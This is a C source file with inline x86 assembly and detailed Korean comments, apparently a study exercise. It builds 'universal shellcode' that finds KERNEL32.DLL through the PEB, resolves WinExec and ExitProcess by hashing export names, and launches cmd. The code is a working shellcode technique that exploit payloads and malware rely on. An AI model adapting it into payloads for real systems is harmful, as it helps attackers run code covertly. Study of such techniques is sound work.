
/*
bool define
*/
#include <stdio.h>
#include <windows.h>


#define TRUE 1
#define FALSE 0

/*
SW_SHOW value is for using WinExec API

UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);

UINT: unsigned int
LPCSTR: long pointer constant string (const char *)
...

unsigned int WinExec(
	const char *lpCmdLine,
	unsigned int uCmdShow
);

*/
#define SW_SHOW 5

/*

purpose:		universal-shellcode
programmer:	woohyuk seo (서우혁)
doc write date: 	12/19/2019
compiler: 	Visual Studio 2019 C++

universal shellcode는 kernel32.dll이 export하는 주소가 매번 바뀌어서 call하는 주소가 유효하지 않게된다
정적으로 만들어진 일반적인 쉘코드의 한계를 극복하기 위해서 만들어졌다.

kenrel32.dll이 process에 mapping되었을때, 해당 kernel32.dll을 얻어낸다음
함수의 주소를 계산한다.

kernel32.dll이 mapping된 곳은 PEB라고한다.

따라서..

universal shellcode를 만들기 위해서 PEB(process environment block)의 위치를 구해야한다.
PEB의 위치를 구하는 과정에서 fs register를 이용한다.

user mode의 fs register는 현재 프로세서의 TEB(thread environment block) 를 가르키고있다.
kernel mode의 fs register는 KPCR (processor control region) 를 가르키고있다. (앞에 붙는 K의 뜻은 kernel의 약자같다.)
KPCR은 schedule info들이 저장된다. (실행될 스레드들의 정보들, 큐 정보, ... 라고 한다.


fs:0x30위치에 PEB가 존재한다.
구조는 다음과 같다.

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
  PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8

  //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )

  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

PEB에서 (2 + 1 + 1 + 4 + 4 = 12) 만큼 더하면 PPEB_LDR_DATA Ldr (포인터 변수)의 주소가 나옴
Loade_export가 가르키는 주소에서, (8 + (4 * 3) = 20)  만큼 더하면 LIST_ENTRY InMemoryOrderModuleList 의 주소가 나옴
InMemoryOrderModuleList 은 이중링크를 가지고 있다.

정보는 다음과 같다
.
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

FLink는 Front Link, BLink는 Back Link라는 뜻임 (맨 마지막 링크는 NULL을 가르키고있음)


각각 링크는 LDR_DATA_TABLE_ENTRY를 가르키고있다.
LDR_DATA_TABLE_ENTRY는 해당 프로세스가 로드한 DLL의 정보를 가지고있다.

정보는 다음과 같다.

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

여기서 주의해야 할 점은, Reserved1멤버부터 계산하지 않고, InMemoryOrderLinks부터 계산하여,  ((4 * 2) + (4 * 2)) = 16byte만큼 더하여 DllBase에 접근해야 한다는 점이다.
이유는 InMemoryOrderLinks는 이중리스트이다, 당연히 계산했을때, Front Link부터 참조될것이다.
Front Link부터 참조됨으로 32비트환경에서의 메모리주소크기 (4byte) 4개 뒤에 DllBase가 존재한다.

DllBase는 mapping된 DLL의 주소를 가지고있다.

DllBase가 가르키는 주소를 register에 참조시키는 방법은 역참조를 사용해야한다.
mov는 레지스터, 변수를 4바이트만큼 복사한다. (movzx, movsx, movs)같은 명령은 4바이트보다 적거나, 큰 바이트를 복사한다.
intel문법에서, 4바이트 역참조의 표현은 다음과 같다. mov register, [register]
DllBase는 LPVOID형식임으로 mov를 사용한다.

C의 함수에서, ebp 레지스터로 부터 덧셈을 진행하면 함수인자값이, 뺄셈을 진행하면 local variable area 가 나온다.

GetApiAddress 함수는 호환성과 이식성을 위해서 남겨둔다.
int GetApiAddress(int ModuleAddress, const char* Name)
{
	int r = 0;

	__asm
	{
		mov edi, [ebp + 8]; //ModuleAddress

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY

		mov [ebp - 12], edx;

	//get string hash

		xor eax, eax;
		xor ecx, ecx;

		xor esi, esi;

		mov ebx, [ebp + 12];

	_NAME_HASH:;
		movsx edx, byte ptr[ebx + ecx];
		add ecx, 1;
		add eax, edx;

		cmp edx, esi;
		jne _NAME_HASH;

		mov [ebp - 16], eax;


	//find api name

		mov eax, [ebp - 12];
		add eax, 32;
		mov eax, [eax];
		add eax, [ebp + 8];

		xor esi, esi;

	_LOOP:;
		mov ebx, [eax + esi * 4];
		add ebx, [ebp + 8];

		xor ecx, ecx;
		xor edi, edi;

	__LOOP:;
		movsx edx, byte ptr[ebx + ecx];

		add edi, edx;
		add ecx, 1;

		cmp edx, 0;
		jne __LOOP;

		cmp edi, [ebp - 16];
		je BREAK_LABLE;

		add esi, 1;

		jmp _LOOP;

	BREAK_LABLE:;

		//get ordinal number of the function

		mov ebx, [ebp - 12];
		add ebx, 36;
		mov ebx, [ebx];

		mov eax, 2;
		mov ecx, esi;
		mul ecx;

		add ebx, eax;
		add ebx, [ebp + 8];

		movsx edx, word ptr[ebx];

		//ordinal is started from one
		add edx, 1;

		//get function address
		mov ebx, [ebp - 12];
		add ebx, 28;
		mov ebx, [ebx];

		add ebx, [ebp + 8];

		mov eax, 4;
		mul edx;
		sub eax, 4;

		add ebx, eax;

		mov ebx, [ebx];
		add ebx, [ebp + 8];

		mov eax, ebx;
		mov r, ebx;
	}

	return r;
}
*/


/*
	example for calculating hash

	const char kernel32_string[] = "KERNEL32.DLL";
	int kernel32_string_hash = 0;

	for (int i = 0; kernel32_string[i] != 0; i++)
	{
		kernel32_string_hash += kernel32_string[i];
	}

	//kernel32_string_hash is 816 (decimal);
*/


void shellcode()
{	
	const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value

	char shell[] = "cmd";
	char LpStrWinExec[] = "WinExec";
	char LpStrExitProcess[] = "ExitProcess";

	__asm
	{
		//eax 레지스터에 PEB저장
		mov eax, fs:0x30;

		//PEB로부터 12다음 주소는 LDR, 역참조를 통해서 멤버에 접근
		mov eax, [eax + 12];
		//멤버에서 20만큼 더하면, LIST_ENTRY InMemoryOrderModuleList이다. 역참조를 통해서 Flink에 접근한다.
		mov eax, [eax + 20];

		//kernel32검증
	get_next_front_link:;

		//FLINK를 통해서 entry에 접근한다. 
		//doubly linked list임으로 역참조를 통해서 다음 entry에 접근할수있다.

		mov eax, [eax];

		//KERNEL32.DLL 문자열값에 대한 해쉬값을 통해서 검증을 진행한다.
		//다음은 유니코드 문자열 구조체이다.

		/*
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;			// + 36
	USHORT MaximumLength;	// + 38
	PWSTR  Buffer;			// + 40
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
		*/

		//ebx holds DllNameLength
		//4 byte to 2 byte (USHORT Length)

		//Length 멤버는 flink를 통해 얻어낸 entry로부터 36다음 주소에 있다.
		//문자열의 길이를 얻어내는 이유는, 유니코드이기 때문에 정확한 길이를 얻어낸다음 해쉬로 만들어야한다.
		movsx ebx, word ptr[eax + 36];

		//DLL의 이름을 알아내야한다.
		//DLL의 이름의 주소는 flink를 통해 얻어낸 entry로부터 다음을 더하면 나온다.
		//40	 = name
		//40 - 8 = full path
		//필요한 멤버는 name이다. 40을 더해서 이름값을 얻는다.
		mov edx, [eax + 40];

		xor esi, esi;
		xor ecx, ecx;
		

	get_hash_lable:;

		//edi에 byte단위의 인덱스접근을 통해 얻어낸 한 문장을 저장한다.
		movsx edi, byte ptr[edx + esi];	
		//hash (ecx)에 한 문장만큼 더한다.
		add ecx, edi;						

		//인덱스를 더한다.
		add esi, 1;	
		//길이와 인덱스를 비교한다.
		cmp esi, ebx;
		//길이와 인덱스가 같지 않을경우 반복한다.
		jne get_hash_lable;
		//길이와 인덱스가 같은경우 반복을 끝낸다.

		//얻어낸 hash와 KERNEL32.DLL의 hash를 비교한다.
		cmp ecx, kernel32_string_hash; 
		//hash가 다를경우 다음 flink를 통해서 다음 entry에 접근해서 KERNEL32.DLL의 hash값을 가진 문자열이 나올때 까지 반복하게된다.
		jne get_next_front_link;
		//hash가 같을경우 반복하지않는다.
		
		//실행파일의 실제 주소 (MZ)를 구한다. flink를 이용해 얻어낸 entry로 부터 16다음 주소에 있다.
		mov ebx, [eax + 16];
		//스택에 저장한다. 
		mov [ebp - 20], ebx;	//MZ

		//함수선언을 위해서 쉘코드 메인으로 점프한다.
		jmp START_CALL;

		//함수선언
	_GetApiAddress:;
		mov edi, [ebp + 8]; //KERNEL32의 주소가 저장되어있다.

		/*
		Image Dos Header에서 0x3c주소는 0xe8을 가르키고있고, 0xe8의 의미는 'PE header' 이다.
		(실제로 PE 시그니처가 존재한다.)
		PE header의 첫부분에서, 0x78만큼 더한다면 IMAGE_EXPORT_DIRECTORY의 RVA가 나온다.
		*/
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY
		
		//스택에 EAT저장
		mov[ebp - 12], edx;

		//찾으려는 API name에 대한 hash를 구한다.
		xor eax, eax;
		xor ecx, ecx;

		xor esi, esi;

		//API name의 주소값을 ebx에 저장
		mov ebx, [ebp + 12];

	_NAME_HASH:;
		//인덱스로 접근한 한문장을 edx에 저장
		movsx edx, byte ptr[ebx + ecx];
		//한문장만큼 eax에 더함
		add eax, edx;
		
		//인덱스를 더함
		add ecx, 1;

		//esi == 0, NULL terminate string임으로, 문자열의 끝을 확인.
		cmp edx, esi;
		//문자열의 끝일때 반복을 종료함.
		//eax에 hash값이 있음.
		jne _NAME_HASH;

		//hash값 스택에 저장.
		mov[ebp - 16], eax;


		//API export name조사.
		//EAT 접근
		mov eax, [ebp - 12];
		//EAT + 32는 Name Pointer Table
		add eax, 32;
		//역참조를 통해서 Name Pointer Table에 접근
		mov eax, [eax];
		//RVA값임으로, VA를 더하여 Name Pointer Table의 실제주소를 얻음.
		add eax, [ebp + 8];

		xor esi, esi;

	_LOOP:;
		//인덱스을 메모리주소값으로 변환하는 과정이다.
		//인덱스 * 4 값으로 더하여 문자열을 참조하는 이유는, 포인터의 크기가 4byte이기 때문이다
		mov ebx, [eax + esi * 4];
		//RVA값인 문자열주소임으로, VA를 더하여 실제 문자열 주소를 얻음.
		add ebx, [ebp + 8];
		//ebx는 API이름 문자열을 가르키고있음.

		xor ecx, ecx;
		xor edi, edi;

	__LOOP:;
		//edx는 인덱스를 통해 접근한 한 문자를 가지고있음
		movsx edx, byte ptr[ebx + ecx];
		//edi에 edx를 더함
		add edi, edx;
		//문자열 인덱스를 더함
		add ecx, 1;

		//null terminate string임으로, 0과 한문자를 비교해서 문자열의 끝을 알아냄
		cmp edx, 0;
		jne __LOOP;
		//문자열의 끝일때 반복을 끝낸다.

		//찾으려는API 이름의 hash와 현재 얻어낸 API이름의 hash를 비교한다.
		cmp edi, [ebp - 16];
		//같을경우 반복을 종료한다.
		je BREAK_LABLE;

		//다를경우 인덱스를 더한다음 반복한다.
		add esi, 1;
		jmp _LOOP;

	BREAK_LABLE:;

		//아래내용은 Ordinal Table, Export Address Table을 이용해서 Export Function Address를 얻는다.
		//문서화되지않았음. 문서화필요

		//get ordinal number of the function
		mov ebx, [ebp - 12];
		add ebx, 36;
		mov ebx, [ebx];

		mov eax, 2;
		mov ecx, esi;
		mul ecx;

		add ebx, eax;
		add ebx, [ebp + 8];

		movsx edx, word ptr[ebx];

		//ordinal is started from one
		add edx, 1;

		//get function address
		mov ebx, [ebp - 12];
		add ebx, 28;
		mov ebx, [ebx];

		add ebx, [ebp + 8];

		mov eax, 4;
		mul edx;
		sub eax, 4;

		add ebx, eax;

		mov ebx, [ebx];
		add ebx, [ebp + 8];

		mov eax, ebx;
		ret;

		//쉘코드 메인
	START_CALL:;
		
		//GetModuleHandle, GetProcAddress을 구현한 함수를 통해서 kernel32.dll의 export function address를 얻어낸다.
		//스택을 통해서 인자값을 전달한다.

		//WinExec API의 주소를 얻는 사용자정의 함수 호출
		//인자준비
		mov eax, [ebp - 20];
		mov [ebp + 8], eax;
		lea ecx, [LpStrWinExec];
		mov[ebp + 12], ecx;
		//함수호출
		call _GetApiAddress;
		
		//export function address는 eax에 저장된다.
		//WinExec API호출
		push 5; //5 means SW_SHOW
		lea ebx, [shell];
		push ebx;
		call eax;

		//ExitProcess API의 주소를 얻는 사용자 정의 함수 호출
		//인자준비
		mov ebx, [ebp - 20];
		mov[ebp + 8], ebx;
		lea ecx, [LpStrExitProcess];
		mov[ebp + 12], ecx;
		//함수호출
		call _GetApiAddress;

		//ExitProcess API호출
		push 0;
		call eax;
	}
}


int main()
{
	shellcode();

	return 0;
}